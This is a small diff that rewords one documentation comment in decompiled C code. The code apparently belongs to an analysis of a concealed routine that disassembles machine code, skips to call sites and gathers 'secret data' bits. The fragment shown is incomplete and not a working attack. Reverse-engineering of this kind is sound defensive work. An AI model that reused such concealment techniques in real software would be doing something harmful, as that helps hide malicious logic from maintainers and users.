@@ -32,7 +32,7 @@ BOOL secret_data_append_from_code
     ctx_wipe_cursor = (dasm_ctx_t *)((long)&ctx_wipe_cursor->instruction + 4);
   }
   cursor_work[0] = shift_cursor;
-  // AutoDoc: When the descriptor points at a call site, fast-forward to the first instruction after the next CALL before collecting bits.
+  // AutoDoc: When start_from_call is TRUE, fast-forward to the first instruction after the next CALL before collecting bits.
   if (start_from_call != FALSE) {
     found_instruction = find_call_instruction((u8 *)code_start,(u8 *)code_end,(u8 *)0x0,&decoder_ctx);
     if (found_instruction == FALSE) {
